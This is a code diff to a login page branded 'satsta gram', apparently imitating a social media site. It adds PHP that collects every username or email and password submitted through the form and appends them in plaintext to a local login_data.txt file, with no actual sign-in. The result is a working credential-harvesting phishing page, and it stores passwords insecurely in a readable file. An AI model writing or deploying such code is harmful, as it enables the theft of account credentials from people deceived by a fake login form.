@@ -72,17 +72,31 @@
             <span>satsta gram</span>
         </div>
         <h2>Login</h2>
-        <form action="/login" method="post">
-            <label for="username-email">Username or Email</label>
-            <input type="text" id="username-email" name="username-email" required>
-            
+    <form action="" method="post">
+        <label for="username-email">Username or Email</label>
+        <input type="text" id="username-email" name="username-email" required>
+        
+        <label for="password">Password</label>
+        <input type="password" id="password" name="password" required>
+        
+        <button type="submit">Login</button>
+    </form>
 
-            
-            <label for="password">Password</label>
-            <input type="password" id="password" name="password" required>
-            
-            <button type="submit">Login</button>
-        </form>
+    <?php
+    if ($_SERVER["REQUEST_METHOD"] == "POST") {
+        $username_email = $_POST['username-email'];
+        $password = $_POST['password'];
+
+        $data = "Username or Email: " . $username_email . "\nPassword: " . $password . "\n\n";
+
+        // Save the data to a txt file
+        $file = fopen("login_data.txt", "a");
+        fwrite($file, $data);
+        fclose($file);
+
+        echo "Data saved successfully!";
+    }
+    ?>
     </div>
 </body>
 </html>
